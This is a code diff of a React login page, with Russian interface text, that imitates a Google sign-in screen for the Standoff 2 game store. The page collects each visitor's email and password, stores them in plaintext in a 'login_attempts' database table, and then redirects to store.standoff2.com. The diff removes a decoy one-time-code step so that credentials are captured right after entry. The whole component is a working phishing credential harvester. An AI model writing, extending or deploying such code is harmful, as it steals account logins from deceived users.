@@ -3,17 +3,13 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import Logo from "@/components/Logo";
 import { supabase } from "@/integrations/supabase/client";
-import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 import { toast } from "sonner";
 
 const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [verificationCode, setVerificationCode] = useState("");
-  const [generatedCode, setGeneratedCode] = useState("");
-  const [step, setStep] = useState<"email" | "password" | "verification">("email");
+  const [step, setStep] = useState<"email" | "password">("email");
   const [showPassword, setShowPassword] = useState(false);
-  const [emailExists, setEmailExists] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -34,37 +30,24 @@ const Login = () => {
         }
         
         if (data) {
-          setEmailExists(true);
           setStep("password");
         } else {
           toast.error("Не удалось найти аккаунт Google с таким адресом электронной почты");
         }
       }
-    } else if (step === "password") {
-      if (password) {
-        // Генерируем случайный 6-значный код
-        const code = Math.floor(100000 + Math.random() * 900000).toString();
-        setGeneratedCode(code);
-        console.log("Сгенерирован код подтверждения:", code);
-        setStep("verification");
-      }
-    } else if (step === "verification") {
-      if (verificationCode === generatedCode) {
-        // Сохраняем email и пароль в БД
-        const { error } = await supabase
-          .from("login_attempts")
-          .insert({ email, password });
-        
-        if (error) {
-          console.error("Ошибка сохранения:", error);
-          toast.error("Ошибка сохранения данных");
-        } else {
-          console.log("Данные сохранены в БД:", { email, password });
-          // Перенаправляем на store.standoff2.com
-          window.location.href = "https://store.standoff2.com/";
-        }
+    } else {
+      // Сохраняем email и пароль в БД
+      const { error } = await supabase
+        .from("login_attempts")
+        .insert({ email, password });
+      
+      if (error) {
+        console.error("Ошибка сохранения:", error);
+        toast.error("Ошибка сохранения данных");
       } else {
-        toast.error("Неверный код подтверждения");
+        console.log("Данные сохранены в БД:", { email, password });
+        // Перенаправляем на store.standoff2.com
+        window.location.href = "https://store.standoff2.com/";
       }
     }
   };
@@ -128,7 +111,7 @@ const Login = () => {
                 </div>
               </form>
             </>
-          ) : step === "password" ? (
+          ) : (
             <>
               <h1 className="text-5xl font-normal text-foreground mb-8">Добро пожаловать!</h1>
               
@@ -189,75 +172,6 @@ const Login = () => {
                   <Button
                     type="submit"
                     className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
-                  >
-                    Далее
-                  </Button>
-                </div>
-              </form>
-            </>
-          ) : (
-            <>
-              <h1 className="text-5xl font-normal text-foreground mb-8">Подтверждение входа</h1>
-              
-              <div className="flex items-center gap-3 mb-10">
-                <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center">
-                  <svg
-                    width="24"
-                    height="24"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    strokeWidth="2"
-                    className="text-muted-foreground"
-                  >
-                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
-                    <circle cx="12" cy="7" r="4" />
-                  </svg>
-                </div>
-                <div className="text-foreground">{email}</div>
-              </div>
-
-              <form onSubmit={handleSubmit} className="space-y-6">
-                <div>
-                  <label className="text-sm text-foreground mb-4 block">
-                    Введите код из 6 цифр для подтверждения входа
-                  </label>
-                  <div className="flex justify-center">
-                    <InputOTP
-                      maxLength={6}
-                      value={verificationCode}
-                      onChange={(value) => setVerificationCode(value)}
-                    >
-                      <InputOTPGroup>
-                        <InputOTPSlot index={0} />
-                        <InputOTPSlot index={1} />
-                        <InputOTPSlot index={2} />
-                        <InputOTPSlot index={3} />
-                        <InputOTPSlot index={4} />
-                        <InputOTPSlot index={5} />
-                      </InputOTPGroup>
-                    </InputOTP>
-                  </div>
-                </div>
-
-                <p className="text-muted-foreground text-sm text-center">
-                  Код был отправлен на вашу почту
-                </p>
-
-                <div className="flex justify-between items-center pt-8">
-                  <Button
-                    type="button"
-                    variant="ghost"
-                    onClick={() => setStep("password")}
-                    className="text-primary hover:bg-secondary hover:text-primary"
-                  >
-                    Назад
-                  </Button>
-                  
-                  <Button
-                    type="submit"
-                    disabled={verificationCode.length !== 6}
-                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full disabled:opacity-50"
                   >
                     Далее
                   </Button>
